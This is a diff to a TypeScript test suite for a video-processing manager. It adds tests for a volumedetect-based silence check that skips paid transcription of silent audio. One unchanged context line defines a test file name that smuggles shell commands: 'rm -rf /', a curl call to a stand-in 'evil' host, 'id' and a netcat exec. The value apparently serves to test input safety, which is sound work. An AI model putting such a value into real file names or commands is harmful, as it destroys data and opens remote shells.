@@ -23,6 +23,7 @@ import { VideoMediaManager } from '../video-media.manager';
 import { type VideoPlanLimitManager } from '../video-plan-limit.manager';
 import { type TranscriptionManager } from '../transcription.manager';
 import {
+  detectAudioVolume,
   extractAudioTrack,
   extractVideoFrame,
   probeMediaFile,
@@ -34,6 +35,7 @@ import {
 import { type MediaProcessResult } from '../../types/video-processing.types';
 
 vi.mock('../../adapters/media-tool.adapter', () => ({
+  detectAudioVolume: vi.fn(),
   probeMediaFile: vi.fn(),
   extractAudioTrack: vi.fn(),
   extractVideoFrame: vi.fn(),
@@ -49,6 +51,19 @@ vi.mock('../../../../common/utilities', () => ({
 const mockedProbe = vi.mocked(probeMediaFile);
 const mockedAudio = vi.mocked(extractAudioTrack);
 const mockedFrame = vi.mocked(extractVideoFrame);
+const mockedVolume = vi.mocked(detectAudioVolume);
+
+/** What ffmpeg's volumedetect prints to stderr, at `-loglevel info`. */
+const volumedetect = (maxDb: string): MediaProcessResult => ({
+  status: MediaProcessStatus.EXITED,
+  exitCode: 0,
+  stdout: Buffer.alloc(0),
+  stderr: `Input #0, mp3, from 'audio.mp3':
+[Parsed_volumedetect_0 @ 0x55] n_samples: 192000
+[Parsed_volumedetect_0 @ 0x55] mean_volume: -30.1 dB
+[Parsed_volumedetect_0 @ 0x55] max_volume: ${maxDb} dB
+`,
+});
 
 const EVIL_NAME = 'clip; rm -rf / $(curl evil) `id` | nc -e.mp4';
 const PLACEHOLDER = `[Video file: ${EVIL_NAME}]`;
@@ -153,6 +168,7 @@ const buildHarness = (file: File | null): Harness => {
     await writeFile(output, DERIVED_AUDIO);
     return exited();
   });
+  mockedVolume.mockResolvedValue(volumedetect('-8.4'));
   const manager = new VideoProcessingManager(
     files as unknown as FilesRepository,
     rabbit as unknown as RabbitMQService,
@@ -284,6 +300,88 @@ describe('VideoProcessingManager', () => {
       'Audio could not be transcribed: Your pay-as-you-go credit cannot cover this transcription.',
     );
     expect(media(write).audioStatus).toBe(VideoAudioStatus.TRANSCRIPTION_FAILED);
+  });
+
+  describe('silence gate (volumedetect before the paid step)', () => {
+    it('a silent track → NO_SPEECH, honest line, no transcription call, no hold', async () => {
+      const harness = buildHarness(buildFile());
+      mockedVolume.mockResolvedValue(volumedetect('-91.0'));
+      await harness.manager.handleJob(JOB);
+
+      expect(mockedVolume).toHaveBeenCalledTimes(1);
+      expect(String(mockedVolume.mock.calls[0]?.[0])).toMatch(/audio\.mp3$/);
+      expect(harness.transcription.transcribeDerivedAudio).not.toHaveBeenCalled();
+      const write = theWrite(harness);
+      expect(write.status).toBe(FileIngestionStatus.COMPLETED);
+      expect(String(write.extractedText).split('\n').at(-1)).toBe(
+        'No speech detected in the audio track.',
+      );
+      expect(media(write)).toMatchObject({
+        audioStatus: VideoAudioStatus.NO_SPEECH,
+        audioReason: null,
+        transcriptionProvider: null,
+        transcriptSegments: [],
+      });
+      expect(published(harness, EventPattern.FILE_VIDEO_PROCESS_COMPLETED)).toMatchObject({
+        audioStatus: VideoAudioStatus.NO_SPEECH,
+        transcriptSegmentCount: 0,
+      });
+    });
+
+    it('-inf (pure digital silence) → NO_SPEECH', async () => {
+      const harness = buildHarness(buildFile());
+      mockedVolume.mockResolvedValue(volumedetect('-inf'));
+      await harness.manager.handleJob(JOB);
+      expect(harness.transcription.transcribeDerivedAudio).not.toHaveBeenCalled();
+      expect(media(theWrite(harness)).audioStatus).toBe(VideoAudioStatus.NO_SPEECH);
+    });
+
+    it('a loud track → measured, then transcribed', async () => {
+      const harness = buildHarness(buildFile());
+      await harness.manager.handleJob(JOB);
+      expect(mockedVolume).toHaveBeenCalledTimes(1);
+      expect(harness.transcription.transcribeDerivedAudio).toHaveBeenCalledTimes(1);
+      expect(media(theWrite(harness)).audioStatus).toBe(VideoAudioStatus.TRANSCRIBED);
+    });
+
+    it('volumedetect fails → fails OPEN to transcription (the old behaviour)', async () => {
+      const harness = buildHarness(buildFile());
+      mockedVolume.mockResolvedValue({
+        status: MediaProcessStatus.TIMED_OUT,
+        exitCode: null,
+        stdout: Buffer.alloc(0),
+        stderr: '',
+      });
+      await harness.manager.handleJob(JOB);
+      expect(harness.transcription.transcribeDerivedAudio).toHaveBeenCalledTimes(1);
+      expect(media(theWrite(harness)).audioStatus).toBe(VideoAudioStatus.TRANSCRIBED);
+    });
+
+    it('no max_volume line in the output → fails open to transcription', async () => {
+      const harness = buildHarness(buildFile());
+      mockedVolume.mockResolvedValue(exited());
+      await harness.manager.handleJob(JOB);
+      expect(harness.transcription.transcribeDerivedAudio).toHaveBeenCalledTimes(1);
+    });
+
+    it('quiet but not silent, and the transcript comes back empty → TRANSCRIPTION_FAILED as before', async () => {
+      const harness = buildHarness(buildFile());
+      mockedVolume.mockResolvedValue(volumedetect('-42.0'));
+      harness.transcription.transcribeDerivedAudio.mockResolvedValue({
+        status: DerivedTranscriptionStatus.FAILED,
+        reason: 'the provider returned an empty transcript',
+      });
+      await harness.manager.handleJob(JOB);
+      expect(harness.transcription.transcribeDerivedAudio).toHaveBeenCalledTimes(1);
+      expect(media(theWrite(harness)).audioStatus).toBe(VideoAudioStatus.TRANSCRIPTION_FAILED);
+    });
+
+    it('a video with no audio track never runs volumedetect', async () => {
+      const harness = buildHarness(buildFile());
+      mockedProbe.mockResolvedValue(exited(probeJson({ audio: false })));
+      await harness.manager.handleJob(JOB);
+      expect(mockedVolume).not.toHaveBeenCalled();
+    });
   });
 
   it('an audio track ffmpeg cannot extract is stated, and nothing is charged', async () => {
